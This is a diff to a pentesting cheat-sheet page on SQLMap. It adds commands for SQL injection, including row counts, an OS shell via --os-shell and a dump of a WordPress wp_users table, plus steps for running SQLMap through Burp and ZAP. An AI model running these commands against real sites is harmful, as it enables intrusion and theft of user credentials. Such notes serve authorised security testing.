@@ -4,6 +4,22 @@ category: Web Application
 order: 98
 ---
 
+> **SQLMap Command**
+
+{% highlight bash %}
+sqlmap.py -u "url" --cookie="cookie" --proxy "proxy"  --batch
+
+#Count Rows
+./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 --count -D sqli -T Customers
+
+#Shell
+./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 --os-shell
+
+#Dump Tables
+sqlmap.py -I rawrequest2.raw --tables
+sqlmap.py -l rawrequest2.raw --dump -D wordpress -T wp_users
+{% endhighlight %}
+
 > **SQL Map Switches**
 
 **Common switches:**
@@ -48,13 +64,23 @@ OS Pwn | <code> --os-pwn </code>
 > **SQLMap with Burp/ZAP**
 
 **Start SQLMap based on ZAP:**
-1. <code> Navigate to field with SQL injection (one that has no errors or SQL injection) -> right click on request -> save RAW </code>
-2. <code> ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 </code>
+1. Navigate to field with SQL injection (one that has no errors or SQL injection) -> right click on request -> save RAW
+2. ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081 
 
 
 **Start SQLMap based on Burp:**
-1) Navigate to request with SQL injection (one that has no errors or SQL injection) -> right click on request -> copy to file
-2) ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081
+1. Navigate to request with SQL injection (one that has no errors or SQL injection) -> right click on request -> copy to file
+2. ./sqlmap.py -l ~/rawrequest.raw   --proxy http://127.0.0.1:8081
 
-
+**Run SQLMap in Zap**
+1. tools -> optins -> applications -> add  -> 
+* sqlmap
+* navigate to sqlmap 
+* as is
+* -u %url% --cookie=%cookie% --batch
+* capture output and note
+* enabled
+2. Right click on request in history -> run application -> SQLMap
+3. Right click on request in history -> view note
+4. Set up for each function you do frequently (e.g., tables, count, read file) 
 
